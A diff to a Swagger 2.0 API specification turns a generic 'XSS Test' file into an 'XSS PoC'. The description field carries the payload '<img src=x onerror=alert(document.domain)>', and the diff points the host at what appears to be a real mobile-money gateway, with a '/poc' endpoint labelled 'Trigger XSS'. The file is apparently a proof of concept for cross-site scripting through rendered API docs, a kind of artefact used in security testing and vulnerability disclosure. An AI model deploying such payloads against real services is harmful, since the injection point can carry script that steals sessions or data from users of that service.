@@ -1,21 +1,23 @@
 {
   "swagger": "2.0",
   "info": {
-    "title": "XSS Test",
-    "description": "<img src=x onerror=alert(document.domain)>",
-    "version": "1.0.0"
+    "version": "1.0.0",
+    "title": "XSS PoC",
+    "description": "<img src=x onerror=alert(document.domain)>"
   },
-  "host": "example.com",
-  "basePath": "/",
-  "schemes": ["https"],
+  "host": "gateway.tz.smartphone.m-pesa.com",
+  "basePath": "/service-adapter",
+  "schemes": [
+    "https"
+  ],
   "paths": {
-    "/test": {
+    "/poc": {
       "get": {
-        "summary": "Test Endpoint",
-        "description": "XSS Test Description",
+        "summary": "Test XSS",
+        "description": "Trigger XSS",
         "responses": {
           "200": {
-            "description": "Success"
+            "description": "OK"
           }
         }
       }
